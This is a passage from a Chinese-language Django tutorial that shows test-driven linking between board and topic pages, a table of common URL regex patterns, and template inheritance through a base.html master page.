self.assertEquals(view.func, home)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_home_view_contains_link_to_topics_page</span><span class="params">(self)</span>:</span></span><br><span class="line">        board_topics_url = reverse(<span class="string">'board_topics'</span>, kwargs=&#123;<span class="string">'pk'</span>: self.board.pk&#125;)</span><br><span class="line">        self.assertContains(self.response, <span class="string">'href="&#123;0&#125;"'</span>.format(board_topics_url))</span><br></pre></td></tr></table></figure><p>注意到现在我们同样在 <strong>HomeTests</strong> 中添加了 <strong>setUp</strong> 方法。这是因为我们现在需要一个 <strong>Board</strong> 实例，并且我们将 <strong>url</strong> 和 <strong>response</strong> 移到了 <strong>setUp</strong>，所以我们能在新测试中重用相同的 response。</p><p>这里的新测试是 <strong>test_home_view_contains_link_to_topics_page</strong>。我们使用 <strong>assertContains</strong> 方法来测试 response 主体部分是否包含给定的文本。我们在测试中使用的文本是 <code>a</code>标签的 <code>href</code>部分。所以基本上我们是在测试 response 主体是否包含文本<code>href=&quot;/boards/1/&quot;</code>。</p><p>让我们运行这个测试：</p><p><code>python manage.py test</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Creating test database for alias &#39;default&#39;...</span><br><span class="line">System check identified no issues (0 silenced).</span><br><span class="line">....F.</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">FAIL: test_home_view_contains_link_to_topics_page (boards.tests.HomeTests)</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">AssertionError: False is not true : Couldn&#39;t find &#39;href&#x3D;&quot;&#x2F;boards&#x2F;1&#x2F;&quot;&#39; in response</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 6 tests in 0.034s</span><br><span class="line"></span><br><span class="line">FAILED (failures&#x3D;1)</span><br><span class="line">Destroying test database for alias &#39;default&#39;...</span><br></pre></td></tr></table></figure><p>现在我们可以编写能通过这个测试的代码。</p><p>编写 <strong>home.html</strong> 模板：</p><p><strong>templates/home.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- code suppressed for brevity --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">  &#123;% for board in boards %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'board_topics' board.pk %&#125;"</span>&gt;</span>&#123;&#123; board.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">"text-muted d-block"</span>&gt;</span>&#123;&#123; board.description &#125;&#125;<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"align-middle"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"align-middle"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- code suppressed for brevity --&gt;</span></span><br></pre></td></tr></table></figure><p>我们只改动了这一行：</p><p><code>{{ board.name }}</code></p><p>变为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'board_topics' board.pk %&#125;"</span>&gt;</span>&#123;&#123; board.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>始终使用 <code>{% url %}</code> 模板标签去写应用的 URL。第一个参数是 URL 的名字(定义在 URLconf， 即 <strong>urls.py</strong>)，然后你可以根据需求传递任意数量的参数。</p><p>如果是一个像主页这种简单的 URL, 那就是 <code>{% url 'home' %}</code>。</p><p>保存文件然后再运行一下测试：</p><p><code>python manage.py test</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Creating test database for alias &#39;default&#39;...</span><br><span class="line">System check identified no issues (0 silenced).</span><br><span class="line">......</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 6 tests in 0.035s</span><br><span class="line"></span><br><span class="line">OK</span><br><span class="line">Destroying test database for alias &#39;default&#39;...</span><br></pre></td></tr></table></figure><p>访问浏览器：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20429django07.png" alt=""></p><p>现在轮到返回的链接了，我们可以先写测试：</p><p><strong>boards/tests.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BoardTopicsTests</span><span class="params">(TestCase)</span>:</span></span><br><span class="line">    <span class="comment"># code suppressed for brevity...</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_board_topics_view_contains_link_back_to_homepage</span><span class="params">(self)</span>:</span></span><br><span class="line">        board_topics_url = reverse(<span class="string">'board_topics'</span>, kwargs=&#123;<span class="string">'pk'</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        response = self.client.get(board_topics_url)</span><br><span class="line">        homepage_url = reverse(<span class="string">'home'</span>)</span><br><span class="line">        self.assertContains(response, <span class="string">'href="&#123;0&#125;"'</span>.format(homepage_url))</span><br></pre></td></tr></table></figure><p>运行测试：</p><p><code>python manage.py test</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Creating test database for alias &#39;default&#39;...</span><br><span class="line">System check identified no issues (0 silenced).</span><br><span class="line">.F.....</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">FAIL: test_board_topics_view_contains_link_back_to_homepage (boards.tests.BoardTopicsTests)</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 7 tests in 0.053s</span><br><span class="line"></span><br><span class="line">FAILED (failures&#x3D;1)</span><br><span class="line">Destroying test database for alias &#39;default&#39;...</span><br></pre></td></tr></table></figure><p>更新主题列表模板：</p><p><strong>templates/topics.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static %&#125;<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="comment">&lt;!-- code suppressed for brevity --&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ol</span> <span class="attr">class</span>=<span class="string">"breadcrumb my-4"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'home' %&#125;"</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item active"</span>&gt;</span>&#123;&#123; board.name &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行测试：</p><p><code>python manage.py test</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Creating test database for alias &#39;default&#39;...</span><br><span class="line">System check identified no issues (0 silenced).</span><br><span class="line">.......</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 7 tests in 0.038s</span><br><span class="line"></span><br><span class="line">OK</span><br><span class="line">Destroying test database for alias &#39;default&#39;...</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20429django08.png" alt=""></p><p> URL 路由是一个 web 应用程序的基本组成部分。有了这些知识，我们才能继续开发。下一步是完成 URL 的部分，你会看到一些使用 URL patterns 的总结。</p><h3 id="实用URL模式列表"><a href="#实用URL模式列表" class="headerlink" title="实用URL模式列表"></a>实用URL模式列表</h3><p>技巧部分是正则表达式。我准备了一个最常用的 URL patterns 的列表。当你需要一个特定的 URL 时你可以参考这个列表。</p><table style="font-size: 1.4rem">  <thead>    <tr>      <th colspan="2" style="font-size: 2rem">主键 自增字段</th>    </tr>  </thead>  <tbody>    <tr>      <th>正则表达式</th>      <td><code>(?P&lt;pk&gt;\d+)</code></td>    </tr>    <tr>      <th>举例</th>      <td><code>url(r'^questions/(?P&lt;pk&gt;\d+)/$', views.question, name='question')</code></td>    </tr>    <tr>      <th>有效URL</th>      <td><code>/questions/934/</code></td>    </tr>    <tr>      <th>捕获数据</th>      <td><code>{'pk': '934'}</code></td>    </tr>  </tbody></table><table style="font-size: 1.4rem">  <thead>    <tr>      <th colspan="2" style="font-size: 2rem">Slug 字段</th>    </tr>  </thead>  <tbody>    <tr>      <th>正则</th>      <td><code>(?P&lt;slug&gt;[-\w]+)</code></td>    </tr>    <tr>      <th>举例</th>      <td><code>url(r'^posts/(?P&lt;slug&gt;[-\w]+)/$', views.post, name='post')</code></td>    </tr>    <tr>      <th>有效 URL</th>      <td><code>/posts/hello-world/</code></td>    </tr>    <tr>      <th>捕获数据</th>      <td><code>{'slug': 'hello-world'}</code></td>    </tr>  </tbody></table><table style="font-size: 1.4rem">  <thead>    <tr>      <th colspan="2" style="font-size: 2rem">有主键的 Slug 字段</th>    </tr>  </thead>  <tbody>    <tr>      <th>正则</th>      <td><code>(?P&lt;slug&gt;[-\w]+)-(?P&lt;pk&gt;\d+)</code></td>    </tr>    <tr>      <th>举例</th>      <td><code>url(r'^blog/(?P&lt;slug&gt;[-\w]+)-(?P&lt;pk&gt;\d+)/$', views.blog_post, name='blog_post')</code></td>    </tr>    <tr>      <th>有效 URL</th>      <td><code>/blog/hello-world-159/</code></td>    </tr>    <tr>      <th>捕获数据</th>      <td><code>{'slug': 'hello-world', 'pk': '159'}</code></td>    </tr>  </tbody></table><table style="font-size: 1.4rem">  <thead>    <tr>      <th colspan="2" style="font-size: 2rem">Django 用户名</th>    </tr>  </thead>  <tbody>    <tr>      <th>正则</th>      <td><code>(?P&lt;username&gt;[\w.@+-]+)</code></td>    </tr>    <tr>      <th>举例</th>      <td><code>url(r'^profile/(?P&lt;username&gt;[\w.@+-]+)/$', views.user_profile, name='user_profile')</code></td>    </tr>    <tr>      <th>有效 URL</th>      <td><code>/profile/vitorfs/</code></td>    </tr>    <tr>      <th>捕获数据</th>      <td><code>{'username': 'vitorfs'}</code></td>    </tr>  </tbody></table><table style="font-size: 1.4rem">  <thead>    <tr>      <th colspan="2" style="font-size: 2rem">Year</th>    </tr>  </thead>  <tbody>    <tr>      <th>正则</th>      <td><code>(?P&lt;year&gt;[0-9]{4})</code></td>    </tr>    <tr>      <th>举例</th>      <td><code>url(r'^articles/(?P&lt;year&gt;[0-9]{4})/$', views.year_archive, name='year')</code></td>    </tr>    <tr>      <th>有效 URL</th>      <td><code>/articles/2016/</code></td>    </tr>    <tr>      <th>捕获数据</th>      <td><code>{'year': '2016'}</code></td>    </tr>  </tbody></table><table style="font-size: 1.4rem">  <thead>    <tr>      <th colspan="2" style="font-size: 2rem">Year / Month</th>    </tr>  </thead>  <tbody>    <tr>      <th>正则</th>      <td><code>(?P&lt;year&gt;[0-9]{4})/(?P&lt;month&gt;[0-9]{2})</code></td>    </tr>    <tr>      <th>举例</th>      <td><code>url(r'^articles/(?P&lt;year&gt;[0-9]{4})/(?P&lt;month&gt;[0-9]{2})/$', views.month_archive, name='month')</code></td>    </tr>    <tr>      <th>有效 URL</th>      <td><code>/articles/2016/01/</code></td>    </tr>    <tr>      <th>捕获数据</th>      <td><code>{'year': '2016', 'month': '01'}</code></td>    </tr>  </tbody></table><p>你可以在这篇文章中看到更多关于正则表达式匹配的细节：<a href="https://simpleisbetterthancomplex.com/references/2016/10/10/url-patterns.html" target="_blank" rel="noopener">https://simpleisbetterthancomplex.com/references/2016/10/10/url-patterns.html</a></p><h2 id="复用模板"><a href="#复用模板" class="headerlink" title="复用模板"></a>复用模板</h2><p>到目前为止，我们一直在复制和粘贴 HTML 文档的多个部分。从长远来看是不可行的。这也是一个坏的做法。</p><p>下面我们将重写 HTML 模板，创建一个<strong>master page(母版页)</strong>，其他模板添加它所独特的部分。</p><p>在<strong>templates</strong> 文件夹中创建一个名为 <strong>base.html</strong> 的文件：</p><p><strong>templates/base.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static %&#125;<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;% block title %&#125;Django Boards&#123;% endblock %&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'css/bootstrap.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ol</span> <span class="attr">class</span>=<span class="string">"breadcrumb my-4"</span>&gt;</span></span><br><span class="line">        &#123;% block breadcrumb %&#125;</span><br><span class="line">        &#123;% endblock %&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">      &#123;% block content %&#125;</span><br><span class="line">      &#123;% endblock %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这是我们的母版页。每个我们创建的模板都 <strong>extend(继承)</strong> 这个特殊的模板。现在我们介绍 <code>{% block %}</code> 标签。它用于在模板中保留一个空间，一个”子”模板(继承这个母版页的模板)可以在这个空间中插入代码和 HTML。</p><p>在 <code>{% block title %}</code> 中我们还设置了一个默认值 “Django Boards.”。如果我们在子模板中未设置 <code>{% block title %}</code>的值它就会被使用。</p><p>现在让我们重写我们的两个模板： <strong>home.html 和 topics.html</strong>。</p><p><strong>templates/home.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block breadcrumb %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item active"</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span> <span class="attr">class</span>=<span class="string">"thead-inverse"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Board<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Posts<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Topics<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Last Post<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">      &#123;% for board in boards %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'board_topics' board.pk %&#125;"</span>&gt;</span>&#123;&#123; board.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">"text-muted d-block"</span>&gt;</span>&#123;&#123; board.description &#125;&#125;<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"align-middle"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"align-middle"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p><strong>home.html</strong> 的第一行是 <code>{% extends 'base.html' %}</code>。这个标签用来告诉 Django 使用 <strong>base.html</strong> 作为母版页。之后，我们使用 blocks 来放置这个页面独有的部分。</p><p><strong>templates/topics.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;</span><br><span class="line">  &#123;&#123; board.name &#125;&#125; - &#123;&#123; block.super &#125;&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block breadcrumb %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'home' %&#125;"</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item active"</span>&gt;</span>&#123;&#123; board.name &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="comment">&lt;!-- just leaving it empty for now. we will add core here soon. --&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>在 <strong>topics.html</strong> 中，我们改变了 <code>{% block title %}</code> 的默认值。注意我们可以通过调用 <code>{{ block.super }}</code> 来重用 block 的默认值。这里我们使用的网页标题是 <strong>base.html</strong> 中定义的 “Django Boards”。所以对于 “Python” 的 board 页面，这个标题是 “Python - Django Boards”,对于 “Random” board 标题会是 “Random - Django Boards”。</p><p>运行测试，并未破坏之前：</p><p><code>python manage.py test</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Creating test database for alias &#39;default&#39;...</span><br><span class="line">System check identified no issues (0 silenced).</span><br><span class="line">.......</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 7 tests in 0.055s</span><br><span class="line"></span><br><span class="line">OK</span><br><span class="line">Destroying test database for alias &#39;default&#39;...</span><br></pre></td></tr></table></figure><p>有了 <strong>bast.html</strong> 模板，我们可以很轻松地在顶部添加一个菜单块：</p><p><strong>templates/base.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static %&#125;<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;% block title %&#125;Django Boards&#123;% endblock %&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'css/bootstrap.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-expand-lg navbar-dark bg-dark"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'home' %&#125;"</span>&gt;</span>Django Boards<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ol</span> <span class="attr">class</span>=<span class="string">"breadcrumb my-4"</span>&gt;</span></span><br><span class="line">        &#123;% block breadcrumb %&#125;</span><br><span class="line">        &#123;% endblock %&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">      &#123;% block content %&#125;</span><br><span class="line">      &#123;% 